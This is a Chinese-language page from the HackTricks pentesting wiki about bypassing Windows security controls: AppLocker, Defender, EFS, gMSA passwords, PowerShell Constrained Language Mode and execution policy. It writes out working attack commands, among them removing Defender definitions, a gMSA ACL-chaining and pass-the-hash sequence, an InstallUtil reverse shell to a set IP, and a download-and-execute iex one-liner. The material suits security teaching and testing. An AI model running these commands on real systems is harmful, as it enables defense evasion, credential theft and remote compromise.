# Windows 安全控制

{{#include ../../banners/hacktricks-training.md}}

## AppLocker 策略

应用白名单是一个已批准的软件应用程序或可执行文件列表，这些应用程序或文件允许存在于系统中并运行。其目标是保护环境免受有害 malware 和未经批准的软件的影响，避免这些软件不符合组织的具体业务需求。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) 是 Microsoft 的**应用程序白名单解决方案**，让系统管理员能够控制**用户可以运行哪些应用程序和文件**。它可以对可执行文件、脚本、Windows installer 文件、DLL、打包应用程序和打包应用程序安装程序实施**细粒度控制**。\
组织通常会**阻止 cmd.exe 和 PowerShell.exe**，并禁止对某些目录的写入权限，**但这些限制都可以被绕过**。

### 检查

检查哪些文件/扩展名被列入黑名单/白名单：
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
此注册表路径包含 AppLocker 应用的配置和策略，可用于查看系统当前强制执行的规则集：

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- 可用于绕过 AppLocker Policy 的**可写文件夹**：如果 AppLocker 允许在 `C:\Windows\System32` 或 `C:\Windows` 中执行任意内容，则可以使用其中的**可写文件夹**来**绕过该策略**。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 通常**受信任的** [**"LOLBAS's"**](https://lolbas-project.github.io/) 二进制文件也可用于绕过 AppLocker。
- **编写不当的规则也可能被绕过**
- 例如，对于 **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，你可以在任意位置创建一个名为 **`allowed`** 的**文件夹**，这样它就会被允许。
- 组织通常也会重点关注**阻止 `%System32%\WindowsPowerShell\v1.0\powershell.exe` 可执行文件**，但会忽略 [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) 中的**其他位置**，例如 `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 或 `PowerShell_ISE.exe`。
- 由于 DLL enforcement 会给系统带来额外负载，并且需要进行大量测试以确保不会出现故障，因此它**很少被启用**。所以，使用 **DLLs 作为后门将有助于绕过 AppLocker**。
- 你可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)，在任意进程中**执行 Powershell** 代码并绕过 AppLocker。更多信息请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)。<sup>[[4]](#references)</sup>

## 凭据存储

### Security Accounts Manager (SAM)

本地凭据存储在此文件中，密码经过哈希处理。

### Local Security Authority (LSA) - LSASS

出于 Single Sign-On 的原因，此子系统的**内存**中保存了**凭据**（哈希值）。\
**LSA** 管理本地**安全策略**（密码策略、用户权限等）、**身份验证**、**访问令牌**等。\
对于本地登录，LSA 将负责检查 **SAM** 文件中提供的**凭据**，并与**域控制器**通信以验证域用户身份。

**凭据**保存在 **LSASS 进程**中：Kerberos tickets、NT 和 LM hashes，以及可轻松解密的密码。

### LSA secrets

LSA 可能会将一些凭据保存到磁盘中：

- Active Directory 计算机账户的密码（无法访问域控制器时）。
- Windows 服务账户的密码
- scheduled tasks 的密码
- 其他（IIS 应用程序的密码等）

### NTDS.dit

它是 Active Directory 的数据库，仅存在于 Domain Controllers 中。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) 是 Windows 10、Windows 11 以及多个 Windows Server 版本中提供的 Antivirus。它会**阻止**常见的 pentesting tools，例如 **`WinPEAS`**。不过，有一些方法可以**绕过这些保护措施**。

### 检查

要检查 **Defender** 的**状态**，可以执行 PS cmdlet **`Get-MpComputerStatus`**（检查 **`RealTimeProtectionEnabled`** 的值以确定它是否处于活动状态）：

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

你也可以运行以下命令对其进行枚举：
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 加密文件系统 (EFS)

EFS 通过加密来保护文件，使用一种称为 **文件加密密钥 (FEK)** 的**对称密钥**。此密钥使用用户的**公钥**加密，并存储在加密文件的 $EFS **备用数据流**中。需要解密时，会使用用户数字证书对应的**私钥**，从 $EFS 流中解密 FEK。更多详情请参见[此处](https://en.wikipedia.org/wiki/Encrypting_File_System)。

**无需用户发起的解密场景**包括：

- 当文件或文件夹被移动到非 EFS 文件系统（例如 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)）时，它们会被自动解密。
- 通过 SMB/CIFS 协议在网络上发送的加密文件，会在传输前被解密。

这种加密方法允许所有者**透明地访问**加密文件。但是，仅更改所有者的密码并登录，并不能解密文件。

**要点**：

- EFS 使用对称 FEK，并通过用户的公钥对其进行加密。
- 解密时使用用户的私钥来访问 FEK。
- 在特定条件下会自动解密，例如复制到 FAT32 或通过网络传输。
- 所有者无需额外操作即可访问加密文件。

### 检查 EFS 信息

通过检查此路径是否存在，可以确认某个**用户**是否**使用过**此**服务**：`C:\users\<username>\appdata\roaming\Microsoft\Protect`

使用 cipher /c \<file>\ 检查**谁**有权**访问**该文件\
也可以在文件夹内使用 `cipher /e` 和 `cipher /d` 来**加密**和**解密**所有文件

### 解密 EFS 文件

#### 成为 Authority System

此方法要求**受害者用户**在主机内**运行**一个**进程**。如果是这种情况，可以使用 `meterpreter` 会话来冒充该用户进程的令牌（使用 `incognito` 中的 `impersonate_token`）。或者，也可以直接 `migrate` 到该用户的进程。

#### 知道用户的密码

Mimikatz 介绍了如何导入用户的证书/私钥材料，并在已知密码的情况下解密受 EFS 保护的文件。<sup>[[6]](#references)</sup>

## 组托管服务帐户 (gMSA)

Microsoft 开发了**组托管服务帐户 (gMSA)**，用于简化 IT 基础设施中服务帐户的管理。与通常启用“**密码永不过期**”设置的传统服务帐户不同，gMSA 提供了更安全、更易管理的解决方案：

- **自动密码管理**：gMSA 使用复杂的 240 位密码，并根据域或计算机策略自动更改。此过程由 Microsoft 的密钥分发服务 (KDC) 处理，无需手动更新密码。
- **增强安全性**：这些帐户不会被锁定，也不能用于交互式登录，从而增强了安全性。
- **支持多个主机**：gMSA 可以在多个主机之间共享，非常适合运行在多台服务器上的服务。
- **计划任务功能**：与托管服务帐户不同，gMSA 支持运行计划任务。
- **简化 SPN 管理**：当计算机的 sAMaccount 详细信息或 DNS 名称发生变化时，系统会自动更新服务主体名称 (SPN)，从而简化 SPN 管理。

gMSA 的密码存储在 LDAP 属性 _**msDS-ManagedPassword**_ 中，并由域控制器 (DC) 每 30 天自动重置一次。此密码是一种称为 [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) 的加密数据 blob，只能由授权管理员以及安装了 gMSA 的服务器检索，从而确保安全的环境。要访问此信息，需要使用 LDAPS 等安全连接，或者连接必须通过“Sealing & Secure”进行身份验证。

![中继 NTLM 身份验证以检索 gMSA 密码](../../images/asd1.png)<sup>[[1]](#references)</sup>

你可以使用 [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup> 读取此密码。
```
/GMSAPasswordReader --AccountName jkohler
```
[**在 archived original research 中获取更多信息**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)。<sup>[[1]](#references)</sup>

同一项研究说明，当被 relay 的 principal 被授权读取 `msDS-ManagedPassword` 时，**NTLM relay attack** 可以获取 **gMSA password**。<sup>[[1]](#references)</sup>

### 利用 ACL chaining 读取 gMSA managed password (GenericAll -> ReadGMSAPassword)

在许多环境中，低权限用户可以通过滥用配置错误的对象 ACL，在不 compromise DC 的情况下访问 gMSA secrets：<sup>[[3]](#references)</sup>

- 一个你可以控制的 group（例如通过 GenericAll/GenericWrite）被授予对某个 gMSA 的 `ReadGMSAPassword` 权限。
- 将自己添加到该 group 后，你将继承通过 LDAP 读取 gMSA 的 `msDS-ManagedPassword` blob 并派生可用 NTLM credentials 的权限。

典型流程：

1) 使用 BloodHound 发现路径，并将你的 foothold principals 标记为 Owned。查找类似以下的 edges：
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) 将自己添加到你控制的 intermediate group（使用 bloodyAD 的示例）：
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) 通过 LDAP 读取 gMSA 管理的密码并推导 NTLM hash。NetExec 会自动提取 `msDS-ManagedPassword` 并将其转换为 NTLM：
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) 使用 NTLM hash 以 gMSA 身份进行身份验证（无需明文凭据）。如果该账户属于 Remote Management Users，WinRM 将直接可用：
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
备注：
- LDAP 读取 `msDS-ManagedPassword` 需要进行 sealing（例如使用 LDAPS/sign+seal）。Tools 会自动处理。
- gMSA 通常会被授予 WinRM 等本地权限；请验证组成员身份（例如 Remote Management Users），以便规划 lateral movement。
- 如果只需要该 blob 来自行计算 NTLM，请参阅 MSDS-MANAGEDPASSWORD_BLOB structure。



## LAPS

可从 [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) 下载的 **Local Administrator Password Solution (LAPS)** 支持管理本地 Administrator 密码。这些密码经过**随机化**处理、各不相同并且会**定期更改**，集中存储在 Active Directory 中。对这些密码的访问通过 ACL 限制，仅授权用户可以访问。在获得足够权限后，即可读取本地 admin 密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **锁定了许多有效使用 PowerShell 所需的功能**，例如阻止 COM objects、仅允许使用经过批准的 .NET types、基于 XAML 的 workflows、PowerShell classes 等。

### **Check**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### 绕过
```bash
#Easy bypass
Powershell -version 2
```
在当前版本的 Windows 上，该 bypass 已不再有效，但你可以使用 [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。\
**要编译它，你可能需要** **添加引用** -> _浏览_ ->_浏览_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`，并将项目**更改为 .Net4.5**。

#### 直接绕过：
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
你可以使用 [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 或 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 在任意进程中**执行 Powershell**代码，并绕过受限模式。更多信息请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)。<sup>[[4]](#references)</sup>

## PS 执行策略

默认情况下，它设置为 **restricted。** 绕过此策略的主要方法：
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

是可用于对用户进行身份验证的 API。

SSPI 会为两个通信中的计算机选择适当的身份验证协议；如果 Kerberos 可用，则优先使用 Kerberos。这些协议由 Security Support Providers (SSPs) 实现，并以 DLL 形式安装在 Windows 上；两个对等端都必须支持协商出的提供程序。

### 主要 SSP

- **Kerberos**：首选协议
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** 和 **NTLMv2**：出于兼容性原因
- %windir%\Windows\System32\msv1_0.dll
- **Digest**：用于 Web 服务器和 LDAP，密码以 MD5 哈希形式存在
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**：SSL 和 TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**：用于协商要使用的协议（Kerberos 或 NTLM，其中 Kerberos 为默认协议）
- %windir%\Windows\System32\lsasrv.dll

#### 协商过程可能提供多种方法，也可能只提供一种。

## UAC - 用户帐户控制

[用户帐户控制 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一项可为**提升权限的活动显示同意提示**的功能。


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [为 gMSA 进行 Relaying – cube0x0（Internet Archive）](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf：通过 rights chaining to WinRM 使用 gMSA](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – 绕过 AppLocker 和 PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 绕过 PowerShell Execution Policy 的 15 种方法](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [如何解密 EFS 文件](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
